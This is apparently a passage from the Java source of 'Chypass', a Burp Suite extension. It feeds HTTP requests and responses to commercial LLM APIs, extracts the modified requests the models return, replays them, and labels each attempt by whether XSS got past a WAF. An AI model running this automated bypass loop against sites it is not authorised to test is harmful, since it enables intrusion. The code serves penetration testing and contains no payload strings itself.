            responseTextArea.setText(finalResponseText);
        });

// 添加测试结果到历史记录 - 使用"等待AI分析"作为初始AI回复
        RequestResponseAIPair testPair = new RequestResponseAIPair(
                requestBytes,
                responseBytes,
                "等待AI分析...",
                history.size() + 1
        );

// 保存这个测试对的ID以便更新
        int testPairId = testPair.getId();
        sessionState.setLastTestPairId(testPairId);

// 添加到历史记录
        history.add(testPair);
// 存储测试对ID到历史索引的映射
        testPairIdToHistoryIndex.put(testPairId, history.size() - 1);

        SwingUtilities.invokeLater(() -> {
            historyTableModel.fireTableDataChanged();
            if (!history.isEmpty()) {
                historyTable.setRowSelectionInterval(history.size() - 1, history.size() - 1);
            }
        });

// Prepare next user message
        String nextUserContent = "Modified HTTP Request:\n\n" + validRequest +
                "\n\nHTTP Response:\n\n" + responseText;

// Add user message to history
        JSONObject nextUserMessage = new JSONObject();
        nextUserMessage.put("role", "user");
        nextUserMessage.put("content", nextUserContent);

// 使用滑动窗口管理对话历史
        if (messageHistory.size() > (MAX_HISTORY * 2)) {
            List<JSONObject> tempHistory = new ArrayList<>();

// 总是保留系统消息
            tempHistory.add(messageHistory.get(0));

// 保留最近的MAX_HISTORY-1对对话，为新的对话预留空间
            int startIdx = messageHistory.size() - (MAX_HISTORY - 1) * 2;
            for (int i = startIdx; i < messageHistory.size(); i++) {
                tempHistory.add(messageHistory.get(i));
            }

// 添加新的用户消息
            tempHistory.add(nextUserMessage);

// 更新消息历史
            messageHistory = tempHistory;
        } else {
// 还没达到最大历史长度，直接添加
            messageHistory.add(nextUserMessage);
        }

        logToConsole("Updated conversation for next iteration, history size: " + messageHistory.size());
    }

    private void stopAISession() {
        logToUI("Stopping AI session...");
        isRunning = false;
        SwingUtilities.invokeLater(() -> {
            sendToAIButton.setEnabled(true);
            stopButton.setEnabled(false);
            manualFixButton.setEnabled(false);
        });
    }

    private void logToConsole(String message) {
        stdout.println("[Chypass] " + message);
    }

    private void logToUI(String message) {
        SwingUtilities.invokeLater(() -> {
            logTextArea.append("[" + new java.util.Date() + "] " + message + "\n");
// Auto-scroll to bottom
            logTextArea.setCaretPosition(logTextArea.getDocument().getLength());
        });
    }

    private String sendToDeepSeekAI() throws IOException {
        logToConsole("Preparing to send request to DeepSeek API");
        URL url = new URL("https://api.deepseek.com/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        json.put("model", "deepseek-chat");

// Convert message history to JSONArray
        JSONArray messagesArray = new JSONArray();
        for (JSONObject message : messageHistory) {
            messagesArray.put(message);
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);

        String jsonBody = json.toString();
        logToConsole("Sending JSON to DeepSeek: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("Received raw response from DeepSeek: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    // 新增：如果存在等待分析的记录，则更新它
    private void updatePendingAnalysisIfNeeded(String aiResponse) {
        // 检查历史记录中是否有待更新的测试对
        for (int i = history.size() - 2; i >= 0; i--) {
            RequestResponseAIPair pair = history.get(i);
            if (pair.getAiResponse().equals("等待AI分析...")) {
                // 找到待更新的记录，用新的AI分析更新它
                logToConsole("Updating previous 'waiting for analysis' record at index " + i);
                pair.setAiResponse(aiResponse);

                // 通知表格模型数据已更新
                final int finalIndex = i;
                SwingUtilities.invokeLater(() -> {
                    historyTableModel.fireTableRowsUpdated(finalIndex, finalIndex);
                });

                // 只更新最近的一条
                break;
            }
        }
    }

    private String sendToSiliconFlowAI() throws IOException {
        logToConsole("Preparing to send request to SiliconFlow API");
        URL url = new URL("https://api.siliconflow.cn/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "ft:";
        }
        json.put("model", modelName);

// Convert message history to JSONArray
// For SiliconFlow we need to handle differently since the API might work differently
        JSONArray messagesArray = new JSONArray();

// Add system message content to user message if present
        String systemContent = "";
        if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
            systemContent = messageHistory.get(0).getString("content") + "\n\n";
        }

// Add all user and assistant messages
        for (int i = 1; i < messageHistory.size(); i++) {
            JSONObject message = messageHistory.get(i);
// For first user message, prepend system content
            if (i == 1 && "user".equals(message.getString("role"))) {
                JSONObject modifiedMessage = new JSONObject();
                modifiedMessage.put("role", "user");
                modifiedMessage.put("content", systemContent + message.getString("content"));
                messagesArray.put(modifiedMessage);
            } else {
                messagesArray.put(message);
            }
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);
        json.put("max_tokens", 4096);

        String jsonBody = json.toString();
        logToConsole("Sending JSON to SiliconFlow: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("Received raw response from SiliconFlow: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    private String sendToQwenAI() throws IOException {
        logToConsole("Preparing to send request to Qwen AI");
        URL url = new URL("https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "qwen-plus";
        }
        json.put("model", modelName);

// Convert message history to JSONArray
        JSONArray messagesArray = new JSONArray();

// 添加所有消息，确保结构符合阿里云API要求
        for (JSONObject message : messageHistory) {
            messagesArray.put(message);
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);
        json.put("max_tokens", 4096);

        String jsonBody = json.toString();
        logToConsole("Sending JSON to Qwen AI: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("Received raw response from Qwen AI: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    private String sendToKimiAI() throws IOException, InterruptedException {
        logToConsole("Preparing to send request to Kimi AI");

// 对Kimi API增加额外延迟以避免429错误
        logToUI("Adding delay before Kimi API request to avoid rate limiting...");
        Thread.sleep(2000); // 增加2秒延迟

        URL url = new URL("https://api.moonshot.cn/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "moonshot-v1-8k";
        }
        json.put("model", modelName);

// 为Kimi重新构建消息历史 - 修复400错误问题
        JSONArray messagesArray = new JSONArray();

// 添加系统消息
        if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
            messagesArray.put(messageHistory.get(0));
        }

// 只添加user和assistant消息，不含其他角色
        for (int i = 1; i < messageHistory.size(); i++) {
            JSONObject message = messageHistory.get(i);
            String role = message.getString("role");

// Kimi可能只接受标准角色: system, user, assistant
            if ("user".equals(role) || "assistant".equals(role)) {
// 创建新的消息对象，只包含role和content字段
                JSONObject cleanMessage = new JSONObject();
                cleanMessage.put("role", role);
                cleanMessage.put("content", message.getString("content"));
                messagesArray.put(cleanMessage);
            }
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);

// Kimi可能不支持其他非标准参数，确保JSON简洁

        String jsonBody = json.toString();
        logToConsole("Sending JSON to Kimi: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

// 检查响应码
        int responseCode = connection.getResponseCode();
        if (responseCode == 429) {
            logToUI("Received 429 Too Many Requests from Kimi API. This will be handled by retry mechanism.");
            throw new IOException("429 Too Many Requests");
        } else if (responseCode == 400) {
// 记录错误详情以便调试
            StringBuilder errorResponse = new StringBuilder();
            try (java.util.Scanner scanner = new java.util.Scanner(connection.getErrorStream(), StandardCharsets.UTF_8.name())) {
                while (scanner.hasNextLine()) {
                    errorResponse.append(scanner.nextLine());
                    errorResponse.append("\n");
                }
            }
            logToConsole("Received 400 Bad Request from Kimi API. Error details: " + errorResponse.toString());

// 如果是第二次请求或更多，尝试使用简化的消息历史
            if (messageHistory.size() > 3) { // 有系统消息+至少一对对话
                logToUI("Trying simplified message history for Kimi API...");

// 创建极简历史: 只保留系统消息和最后一条用户消息
                JSONArray simplifiedMessages = new JSONArray();

// 添加系统消息
                if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
                    JSONObject sysMsg = new JSONObject();
                    sysMsg.put("role", "system");
                    sysMsg.put("content", messageHistory.get(0).getString("content"));
                    simplifiedMessages.put(sysMsg);
                }

// 查找最后一条用户消息
                for (int i = messageHistory.size() - 1; i >= 0; i--) {
                    if ("user".equals(messageHistory.get(i).getString("role"))) {
                        JSONObject userMsg = new JSONObject();
                        userMsg.put("role", "user");
                        userMsg.put("content", messageHistory.get(i).getString("content"));
                        simplifiedMessages.put(userMsg);
                        break;
                    }
                }

// 更新请求JSON
                json.put("messages", simplifiedMessages);
                jsonBody = json.toString();
                logToConsole("Retrying with simplified messages: " + jsonBody);

// 重新发送请求
                HttpURLConnection retryConnection = (HttpURLConnection) url.openConnection();
                retryConnection.setRequestMethod("POST");
                retryConnection.setRequestProperty("Content-Type", "application/json");
                retryConnection.setRequestProperty("Authorization", "Bearer " + apiKey);
                retryConnection.setDoOutput(true);
                retryConnection.setConnectTimeout(30000);
                retryConnection.setReadTimeout(60000);

                try (OutputStream os = retryConnection.getOutputStream()) {
                    byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

// 检查重试响应
                if (retryConnection.getResponseCode() == 200) {
                    StringBuilder response = new StringBuilder();
                    try (java.util.Scanner scanner = new java.util.Scanner(retryConnection.getInputStream(), StandardCharsets.UTF_8.name())) {
                        while (scanner.hasNextLine()) {
                            response.append(scanner.nextLine());
                            response.append("\n");
                        }
                    }

                    String responseStr = response.toString();
                    logToConsole("Simplified request succeeded. Response: " + responseStr);

                    JSONObject responseJson = new JSONObject(responseStr);
                    String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
                    updatePendingAnalysisIfNeeded(aiResponse);

                    return aiResponse;
                } else {
// 如果简化请求还是失败，抛出更详细的异常
                    throw new IOException("Failed with both normal and simplified requests. Status: " + retryConnection.getResponseCode());
                }
            } else {
                throw new IOException("Bad Request (400): " + errorResponse.toString());
            }
        }

// 处理成功响应
        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("Received raw response from Kimi: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    // 添加指数退避重试机制
    private String sendToKimiAIWithRetry(int retryCount) throws IOException, InterruptedException {
        if (retryCount > 3) { // 最多重试3次
            throw new IOException("Exceeded maximum retry attempts for Kimi API");
        }

        try {
// 指数退避延迟
            int waitTime = 2000 * (int)Math.pow(2, retryCount);
            if (retryCount > 0) {
                logToUI("Retry attempt " + retryCount + " for Kimi API, waiting " + (waitTime/1000) + " seconds...");
                Thread.sleep(waitTime);
            }

            return sendToKimiAI();
        } catch (IOException e) {
            if (e.getMessage().contains("429")) {
                logToUI("Received 429 Too Many Requests from Kimi API, will retry with longer delay");
                return sendToKimiAIWithRetry(retryCount + 1);
            } else {
                throw e; // 其他IO异常直接抛出
            }
        }
    }

    private String extractRequestFromAIResponse(String aiResponse) {
        logToConsole("Extracting request from AI response");

// 查找代码块格式的请求
        int startIndex = aiResponse.indexOf("```http");
        if (startIndex == -1) {
            startIndex = aiResponse.indexOf("```HTTP");
        }

        if (startIndex != -1) {
// 找到代码块开始位置
            startIndex = aiResponse.indexOf("\n", startIndex);
            if (startIndex != -1) {
                startIndex += 1;

// 查找代码块结束位置
                int endIndex = aiResponse.indexOf("```", startIndex);
                if (endIndex != -1) {
                    String extractedRequest = aiResponse.substring(startIndex, endIndex).trim();
                    logToConsole("Extracted request from code block");
                    return extractedRequest;
                }
            }
        }

// 如果没有找到代码块，尝试直接提取HTTP请求
        logToConsole("No code block markers found, looking for HTTP request patterns");

// 寻找常见HTTP方法开头的行
        String[] lines = aiResponse.split("\n");
        StringBuilder requestBuilder = new StringBuilder();
        boolean foundRequestLine = false;
        boolean inHeaders = false;
        boolean inBody = false;

        for (String line : lines) {
            line = line.trim();

// 查找请求行
            if (!foundRequestLine && (line.startsWith("GET ") ||
                    line.startsWith("POST ") ||
                    line.startsWith("PUT ") ||
                    line.startsWith("DELETE ") ||
                    line.startsWith("HEAD ") ||
                    line.startsWith("OPTIONS "))) {

                foundRequestLine = true;
                inHeaders = true;
                requestBuilder.append(line).append("\n");
                continue;
            }

// 如果找到了请求行，开始收集头部和请求体
            if (foundRequestLine) {
                if (inHeaders) {
                    if (line.isEmpty()) {
// 空行表示头部结束，请求体开始
                        inHeaders = false;
                        inBody = true;
                        requestBuilder.append("\n"); // 添加空行
                    } else {
// 继续收集头部
                        requestBuilder.append(line).append("\n");
                    }
                } else if (inBody) {
// 收集请求体
                    requestBuilder.append(line).append("\n");
                }
            }
        }

        if (foundRequestLine) {
            String extractedRequest = requestBuilder.toString().trim();
            logToConsole("Extracted request from text content");
            return extractedRequest;
        }

// 如果还是没找到合适的请求，返回错误
        logToConsole("No valid HTTP request found in AI response");
        return null;
    }

    /**
     * 验证和修复HTTP请求格式 - 重构后的方法，确保正确处理HTTP请求格式
     */
    private String validateAndFixRequest(String request) {
        logToConsole("Validating and fixing request format");

        if (request == null || request.trim().isEmpty()) {
            logToConsole("Request is null or empty");
            return null;
        }

        // 检查并规范化行尾
        request = request.replace("\r\n", "\n");

        // 尝试分离请求头和请求体，严格遵循HTTP规范
        String[] sections;
        if (request.contains("\n\n")) {
            sections = request.split("\n\n", 2);
        } else {
            // 如果没有找到空行，假设整个内容都是请求头
            sections = new String[] { request, "" };
            logToConsole("Warning: No empty line found to separate headers and body");
        }

        String headerSection = sections[0];
        String body = sections.length > 1 ? sections[1] : "";

        // 解析请求行和请求头
        String[] headerLines = headerSection.split("\n");
        if (headerLines.length == 0) {
            logToConsole("No header lines found");
            return null;
        }

        // 验证并修复请求行
        String requestLine = headerLines[0];
        if (!requestLine.matches("(GET|POST|PUT|DELETE|HEAD|OPTIONS) .+ HTTP/[0-9]\\.[0-9]")) {
            logToConsole("Invalid request line: " + requestLine);

            // 尝试修复请求行
            if (requestLine.startsWith("GET ") || requestLine.startsWith("POST ") ||
                    requestLine.startsWith("PUT ") || requestLine.startsWith("DELETE ") ||
                    requestLine.startsWith("HEAD ") || requestLine.startsWith("OPTIONS ")) {

                // 如果缺少HTTP版本，添加它
                if (!requestLine.contains(" HTTP/")) {
                    requestLine += " HTTP/1.1";
                    logToConsole("Fixed request line by adding HTTP version: " + requestLine);
                }
            } else {
                return null; // 无法修复的请求行
            }
        }

        // 提取HTTP方法
        String method = requestLine.split(" ")[0];

        // 分析和收集现有的请求头
        boolean hasHost = false;
        boolean hasContentType = false;
        boolean hasContentLength = false;

        // 创建一个键值对来存储并去重请求头
        java.util.Map<String, String> headers = new java.util.LinkedHashMap<>();

        // 添加请求行
        StringBuilder fixedRequest = new StringBuilder(requestLine).append("\r\n");

        // 处理其他请求头
        for (int i = 1; i < headerLines.length; i++) {
            String headerLine = headerLines[i].trim();
            if (headerLine.isEmpty()) continue; // 跳过空行

            if (headerLine.contains(":")) {
                String[] parts = headerLine.split(":", 2);
                String headerName = parts[0].trim();
                String headerValue = parts.length > 1 ? parts[1].trim() : "";

                // 检查重要的请求头
                String headerNameLower = headerName.toLowerCase();
                if (headerNameLower.equals("host")) {
                    hasHost = true;
                } else if (headerNameLower.equals("content-type")) {
                    hasContentType = true;
                } else if (headerNameLower.equals("content-length")) {
                    hasContentLength = true;
                    // 我们将在后面重新计算Content-Length
                    continue;
                }

                // 存储请求头，确保没有重复
                headers.put(headerName, headerValue);
            } else {
                logToConsole("Skipping invalid header: " + headerLine);
            }
        }

        // 如果没有Host请求头，添加一个
        if (!hasHost && currentHttpService != null) {
            String hostValue = currentHttpService.getHost();
            if (currentHttpService.getPort() != 80 && currentHttpService.getPort() != 443) {
                hostValue += ":" + currentHttpService.getPort();
            }
            headers.put("Host", hostValue);
            logToConsole("Added missing Host header: " + hostValue);
        }

        // 对于POST或PUT请求，确保有Content-Type
        if (("POST".equals(method) || "PUT".equals(method)) && body.length() > 0 && !hasContentType) {
            headers.put("Content-Type", "application/x-www-form-urlencoded");
            logToConsole("Added default Content-Type for " + method + " request");
        }

        // 重新计算并添加Content-Length
        if (("POST".equals(method) || "PUT".equals(method)) && body.length() > 0) {
            // 使用UTF-8计算字节长度，这更可能是正确的
            int contentLength = body.getBytes(StandardCharsets.UTF_8).length;
            headers.put("Content-Length", String.valueOf(contentLength));
            logToConsole("Set Content-Length to " + contentLength);
        }

        // 添加所有处理好的请求头
        for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
            fixedRequest.append(header.getKey()).append(": ").append(header.getValue()).append("\r\n");
        }

        // 添加空行，严格使用CRLF
        fixedRequest.append("\r\n");

        // 添加请求体
        if (body.length() > 0) {
            fixedRequest.append(body);
            // 确保请求体不以换行符结束，但如果原始请求体有尾部换行则保留
            if (!body.endsWith("\n") && !body.endsWith("\r\n")) {
                fixedRequest.append("\r\n");
            }
        }

        String finalRequest = fixedRequest.toString();
        logToConsole("Validated and fixed request (length: " + finalRequest.length() + " bytes)");
        return finalRequest;
    }

    /**
     * 紧急修复HTTP请求格式的最后一道防线 - 重构后的方法
     */
    private String tryToFixHttpRequestFormat(String request) {
        logToConsole("Trying emergency HTTP request format fix");

        if (request == null || request.trim().isEmpty()) {
            return null;
        }

        // 规范化换行符
        request = request.replace("\r\n", "\n");

        // 分析请求结构
        String[] lines = request.split("\n");
        if (lines.length == 0) {
            return null;
        }

        StringBuilder fixedRequest = new StringBuilder();

        // 处理请求行
        String requestLine = lines[0];
        if (!(requestLine.startsWith("GET ") || requestLine.startsWith("POST ") ||
                requestLine.startsWith("PUT ") || requestLine.startsWith("DELETE ") ||
                requestLine.startsWith("HEAD ") || requestLine.startsWith("OPTIONS "))) {

            logToConsole("Invalid request line, cannot fix: " + requestLine);
            return null;
        }

        // 确保请求行有HTTP版本
        if (!requestLine.contains(" HTTP/")) {
            requestLine += " HTTP/1.1";
            logToConsole("Added HTTP version to request line");
        }

        fixedRequest.append(requestLine).append("\r\n");

        // 解析HTTP方法
        String method = requestLine.split(" ")[0];

        // 处理请求头和检查必需的头部
        boolean foundEmptyLine = false;
        boolean hasHost = false;
        boolean hasContentType = false;
        boolean hasContentLength = false;
        StringBuilder bodyBuilder = new StringBuilder();

        // 维护一个头部集合以防止重复
        java.util.Map<String, String> headers = new java.util.LinkedHashMap<>();

        // 处理所有行
        for (int i = 1; i < lines.length; i++) {
            String line = lines[i].trim();

            if (line.isEmpty()) {
                // 找到空行，表示请求头和请求体的分界
                foundEmptyLine = true;
                continue;
            }

            if (!foundEmptyLine) {
                // 仍在处理请求头
                if (line.contains(":")) {
                    String[] parts = line.split(":", 2);
                    String headerName = parts[0].trim();
                    String headerValue = parts.length > 1 ? parts[1].trim() : "";

                    // 检查重要的头部
                    String headerNameLower = headerName.toLowerCase();
                    if (headerNameLower.equals("host")) {
                        hasHost = true;
                    } else if (headerNameLower.equals("content-type")) {
                        hasContentType = true;
                    } else if (headerNameLower.equals("content-length")) {
                        hasContentLength = true;
                        // 我们稍后会重新计算
                        continue;
                    }

                    // 存储头部
                    headers.put(headerName, headerValue);
                } else {
                    logToConsole("Skipping invalid header line: " + line);
                }
            } else {
                // 收集请求体
                bodyBuilder.append(line).append("\n");
            }
        }

        // 如果没有找到空行但有内容，可能整个请求都是头部
        if (!foundEmptyLine && lines.length > 1) {
            logToConsole("No empty line found, treating all content as headers");
        }

        // 确保有Host头部
        if (!hasHost && currentHttpService != null) {
            String hostValue = currentHttpService.getHost();
            if (currentHttpService.getPort() != 80 && currentHttpService.getPort() != 443) {
                hostValue += ":" + currentHttpService.getPort();
            }
            headers.put("Host", hostValue);
            logToConsole("Added Host header: " + hostValue);
        }

        // 提取请求体
        String body = bodyBuilder.toString().trim();

        // 对于POST或PUT请求，确保必要的头部
        if (("POST".equals(method) || "PUT".equals(method))) {
            if (!hasContentType && body.length() > 0) {
                headers.put("Content-Type", "application/x-www-form-urlencoded");
                logToConsole("Added Content-Type header for " + method + " request");
            }

            if (body.length() > 0) {
                // 计算Content-Length
                int contentLength = body.getBytes(StandardCharsets.UTF_8).length;
                headers.put("Content-Length", String.valueOf(contentLength));
                logToConsole("Set Content-Length to " + contentLength);
            }
        }

        // 添加所有头部
        for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
            fixedRequest.append(header.getKey()).append(": ").append(header.getValue()).append("\r\n");
        }

        // 添加空行
        fixedRequest.append("\r\n");

        // 添加请求体
        if (body.length() > 0) {
            fixedRequest.append(body);
            // 确保请求体有适当的终止
            if (!body.endsWith("\n")) {
                fixedRequest.append("\r\n");
            }
        }

        String finalRequest = fixedRequest.toString();
        logToConsole("Emergency fixed request (length: " + finalRequest.length() + " bytes):\n" + finalRequest);
        return finalRequest;
    }

    // 更新的RequestResponseAIPair类，支持更新AI响应
    private class RequestResponseAIPair {
        private byte[] request;
        private byte[] response;
        private String aiResponse;
        private int id;

        public RequestResponseAIPair(byte[] request, byte[] response, String aiResponse, int id) {
            this.request = request;
            this.response = response;
            this.aiResponse = aiResponse;
            this.id = id;
        }

        public byte[] getRequest() {
            return request;
        }

        public byte[] getResponse() {
            return response;
        }

        public String getAiResponse() {
            return aiResponse;
        }

        // 添加setter方法以支持更新AI响应
        public void setAiResponse(String aiResponse) {
            this.aiResponse = aiResponse;
        }

        public int getId() {
            return id;
        }
    }

    private class HistoryTableModel extends AbstractTableModel {
        private final String[] columnNames = {"#", "Request Length", "Response Length", "Status", "XSS Success"};

        @Override
        public int getRowCount() {
            return history.size();
        }

        @Override
        public int getColumnCount() {
            return columnNames.length;
        }

        @Override
        public String getColumnName(int column) {
            return columnNames[column];
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            RequestResponseAIPair pair = history.get(rowIndex);

            switch (columnIndex) {
                case 0:
                    return pair.getId();
                case 1:
                    return pair.getRequest().length;
                case 2:
                    return pair.getResponse().length;
                case 3:
                    try {
                        IResponseInfo responseInfo = helpers.analyzeResponse(pair.getResponse());
                        return responseInfo.getStatusCode();
                    } catch (Exception e) {
                        logToConsole("Error analyzing response: " + e.getMessage());
                        return "Error";
                    }
                case 4:
// 分析AI响应，查找成功的指示符
                    String aiResp = pair.getAiResponse().toLowerCase();
// 如果是等待分析的项，直接返回待分析状态
                    if (aiResp.equals("等待ai分析...")) {
                        return "等待分析";
                    } else if (aiResp.contains("xss成功") ||
                            aiResp.contains("成功注入") ||
                            aiResp.contains("成功绕过") ||
                            aiResp.contains("绕过了waf") ||
                            aiResp.contains("注入成功") ||
                            aiResp.contains("payload成功执行") ||
                            aiResp.contains("alert") && aiResp.contains("成功") ||
                            aiResp.contains("javascript") && aiResp.contains("执行成功")) {
                        return "可能成功";
                    } else if (aiResp.contains("被拦截") ||
                            aiResp.contains("waf拦截") ||
                            aiResp.contains("被过滤") ||
                            aiResp.contains("被转义") ||
                            aiResp.contains("无法绕过") ||
                            aiResp.contains("依然被拦截")) {
                        return "被拦截";
                    } else {
                        return "未确定";
                    }
                default:
                    return null;
            }
        }
    }
}
